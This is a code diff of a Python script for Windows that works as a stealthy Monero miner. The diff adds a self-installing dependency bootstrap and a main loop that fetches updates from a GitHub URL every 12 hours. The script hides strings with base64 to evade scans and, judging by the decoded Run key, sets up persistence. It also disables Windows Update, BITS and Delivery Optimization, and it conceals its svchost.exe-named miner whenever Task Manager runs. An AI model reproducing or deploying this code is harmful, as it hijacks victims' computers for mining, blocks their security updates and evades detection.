@@ -1,4 +1,27 @@
-import os, sys, time, winreg, subprocess, requests, psutil, base64, argparse, platform
+import os, sys, subprocess
+
+# --- 0. THE VOICE FIX (BOOTSTRAP) ---
+def bootstrap():
+    """Ensures the engine has its voice (requests and psutil) before starting."""
+    try:
+        import requests, psutil
+    except ImportError:
+        # We find our python directory and target the site-packages
+        work_dir = os.path.dirname(os.path.realpath(sys.executable))
+        lib_path = os.path.join(work_dir, "Lib", "site-packages")
+        if not os.path.exists(lib_path): os.makedirs(lib_path)
+        
+        # We use the embedded pip to get our libraries
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "psutil", "--target", lib_path])
+        
+        # Restart to recognize the new voice
+        os.execv(sys.executable, [sys.executable] + sys.argv)
+
+bootstrap()
+
+# --- NOW WE CAN IMPORT EVERYTHING ---
+import time, winreg, base64, argparse, platform
+import requests, psutil
 
 # --- 1. Identity & Dual Webhook Setup ---
 parser = argparse.ArgumentParser()
@@ -12,13 +35,12 @@ WALLET = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpj
 POOL = "pool.supportxmr.com:443"
 UPDATE_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
 
-# Obfuscated Strings (Bypassing scans)
+# Obfuscated Strings
 REG_RUN = base64.b64decode("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu").decode()
 SVC_LIST = ["d3VhdXNlcnY=", "Yml0cw==", "ZG9zdmM="]
 PC_NAME = platform.node()
 WORK_DIR = os.path.join(os.getenv('APPDATA'), ID)
 SELF_PATH = os.path.realpath(__file__)
-TWELVE_HOURS = 43200 # 12 Hours in seconds
 
 CONFIG = {
     "MINER": os.path.join(WORK_DIR, f"{ID}.exe"),
@@ -54,12 +76,6 @@ def engage_locks():
             name = base64.b64decode(s).decode()
             subprocess.run(["sc", "config", name, "start=disabled"], capture_output=True)
             subprocess.run(["sc", "stop", name], capture_output=True)
-        
-        reg_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\DefaultMediaCost"
-        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, "Ethernet", 0, winreg.REG_DWORD, 2)
-        winreg.SetValueEx(key, "WiFi", 0, winreg.REG_DWORD, 2)
-        winreg.CloseKey(key)
         notify("Windows Updates locked.", "sys")
     except: pass
 
@@ -81,7 +97,6 @@ def manage_power():
     """Hides from Taskmgr and toggles 90/30 power with DNA check."""
     is_monitored = any(p.info['name'] == CONFIG["WATCH"] for p in psutil.process_iter(['name']))
     
-    # DNA Check: Only find OUR svchost.exe by its full file path
     miner_proc = None
     for p in psutil.process_iter(['name', 'exe']):
         try:
@@ -109,4 +124,16 @@ def manage_power():
 
 def main():
     engage_locks()
-    notify("SYSTEM
+    notify("SYSTEM ONLINE", "sys")
+    last_update = time.time()
+    
+    while True:
+        manage_power()
+        # Update check every 12 hours
+        if time.time() - last_update > 43200:
+            auto_update()
+            last_update = time.time()
+        time.sleep(10)
+
+if __name__ == "__main__":
+    main()
